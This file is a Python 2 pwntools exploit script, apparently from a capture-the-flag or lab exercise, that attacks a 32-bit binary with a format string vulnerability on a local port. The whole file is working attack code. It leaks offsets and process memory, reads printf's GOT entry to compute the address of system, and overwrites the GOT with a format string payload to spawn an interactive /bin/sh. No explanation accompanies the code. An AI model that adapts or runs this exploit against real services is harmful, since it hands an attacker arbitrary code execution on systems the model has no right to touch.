from pwn import *
import sys

context.log_level = 'debug'
#context.arch = 'amd64'
elf = ELF('./vuln32_fmt')

#io = process('./vuln32_fmt')

def exec_fmt(payload):
    io = remote('127.0.0.1', 2333)
    io.send(payload);
    data = io.recv()
    return data

def leak_fmt_off():
    auto_fmt = FmtStr(exec_fmt)
    print auto_fmt.offset
    #payload = fmtstr_payload(auto_fmt.offset, 

def vdump_proc():
    fake_addr_test = 'bbbb'
    vuln_start_addr = 0x8048000
    '''
    for i in range(20):
        io = remote('127.0.0.1', 2333)
        padd_str = '%' + str(i) + '$x'
        padd_str = padd_str.ljust(8, 'a') + fake_addr_test
        try:
            io.send(padd_str)
        except EOFError:
            print 'send fmt error'
            pass
        try:
            io.recv()
        except EOFError:
            print 'none string'
            pass
        io.close()
    '''
    fp_dump = open('proc.dump', 'ab+')
    leakfunc_offset = 0

    while True:
        io = remote('127.0.0.1', 2333)
        padd_str = '%' + str(13) + '$s'
        padd_str = padd_str.ljust(8, 'a') + p32(vuln_start_addr+leakfunc_offset)
        io.send(padd_str)
        try:
            data = io.recvuntil('aaa')[:-3]
        except EOFError:
            print hex(leakfunc_offset)
            sys.exit(0)
        data += '\x00'
        leakfunc_offset += len(data)
        fp_dump.write(data)
        fp_dump.flush()
        io.close()

    fp_dump.close()

def vexp():
    printf_got = 0x804A010
    pr_sys_offset = 0x49670-0x3ADA0
    io = remote('127.0.0.1', 2333)
    padd_str = '%13$saaa' + p32(printf_got)
    io.send(padd_str)
    leaked_print_addr = (io.recvuntil('aaa')[:-3])[:4]
    leaked_print_addr = u32(leaked_print_addr)
    print hex(leaked_print_addr)
    system_addr = leaked_print_addr - pr_sys_offset
    print hex(system_addr)
    raw_input('continue?')
    payload = fmtstr_payload(11, {printf_got : system_addr})
    io.send(payload)
    io.sendline('/bin/sh')
    io.interactive()

#leak_fmt_off()
#vdump_proc()
vexp()

